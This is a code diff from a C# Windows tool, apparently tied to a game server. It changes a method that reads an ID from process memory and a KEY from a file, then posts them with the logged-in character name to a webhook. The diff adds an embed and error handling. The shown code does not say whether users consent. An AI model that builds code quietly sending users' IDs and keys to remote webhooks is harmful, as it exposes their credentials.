@@ -3784,27 +3784,50 @@ namespace Kappa
 
         private async void YourCallingMethod()
         {
+            // Read the ID and Key from the file
             saveID = m.ReadString(IDadr);
             string value = ReadKeyFromFile();
 
+            // Define the webhook payload
             var payload = new
             {
                 avatar_url = "https://playserver.in.th/user_image/server_icon/2044315_2112860358.gif",
                 username = ServerName,
-                content = $"ตัวละครที่ล็อคอิน: {label1.Text}\nID: {saveID}\nKEY: {value} "
-
+                content = $"ตัวละครที่ล็อคอิน: {label1.Text}\nID: {saveID}\nKEY: {value}",
+                embeds = new[]
+                {
+            new
+            {
+                footer = new
+                {
+                    text = "Server Lockedin",
+                    icon_url = "https://playserver.in.th/user_image/server_icon/2044315_2112860358.gif"
+                },
+                timestamp = DateTime.UtcNow.ToString("o") // Use UTC for a universal timestamp
+            }
+        }
             };
 
             // Call the SendWebhookAsync function
-            bool success = await WebhookSender.SendWebhookAsync(webhookUrl, payload);
+            try
+            {
+                bool success = await WebhookSender.SendWebhookAsync(webhookUrl, payload);
 
-            if (success)
-            {
-                // MessageBox.Show("Webhook sent successfully!");
+                if (success)
+                {
+                    // Optionally show a success message
+                    // MessageBox.Show("Webhook sent successfully!");
+                }
+                else
+                {
+                    // Optionally show an error message
+                    // MessageBox.Show("Failed to send webhook.");
+                }
             }
-            else
+            catch (Exception ex)
             {
-                // MessageBox.Show("Failed to send webhook.");
+                // Handle any exceptions that occur during the webhook call
+                MessageBox.Show($"An error occurred: {ex.Message}");
             }
         }
         private async void GMAlert()
